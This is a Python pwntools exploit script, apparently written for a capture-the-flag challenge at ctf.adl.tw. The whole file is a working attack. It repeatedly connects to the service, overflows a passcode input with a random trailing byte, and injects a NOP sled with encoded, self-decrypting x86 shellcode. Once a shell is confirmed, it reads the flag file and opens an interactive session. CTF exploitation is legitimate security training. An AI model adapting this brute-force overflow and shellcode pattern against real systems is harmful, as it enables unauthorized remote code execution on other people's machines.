from pwn import *

ip = 'ctf.adl.tw'
port = 11005
import  random
# context.log_level = 'debug'
count = 0
while 1:
    try:
        count += 1
        if (count%50)==0:
            time.sleep(5)
        r = remote(ip,port)
        r.recvuntil('Enter your passcode: \n')
        r.send(b'A'*0x10+p8(random.randint(0,255)))
        r.recvuntil('Provide the result in CSV format: \n')
        shellcode = b"\x29\xC9\x74\x14\x5E\xB1\x14\x46\x8B\x06\x83\xE8\x09\x34\x9F\x32\x46\xFF\x88\x06\xE2\xF1\xEB\x05\xE8\xE7\xFF\xFF\xFF\x31\x70\xAA\x92\xD7\x2D\xCE\xAF\xE1\xA8\xCC\x8D\xA8\xE1\xDB\x9D\xA1\x81\xFE\xBA\xDB"
        # p = run_shellcode(shellcode)
        r.send(b'\x90'*(0x60-len(shellcode))+shellcode)
        print(len(shellcode))
        r.recvuntil('Analyzing simutaion result...\n')
        r.sendline(b'ls')
        test_getshell = r.recv()
        if b'bin' in test_getshell:
            print("found")
            print(test_getshell)
            r.sendline(b'cat /home/ANALYZER/flag')
            try:
                print(r.recv())
            except:pass
            r.interactive()
    except:
        r.close()

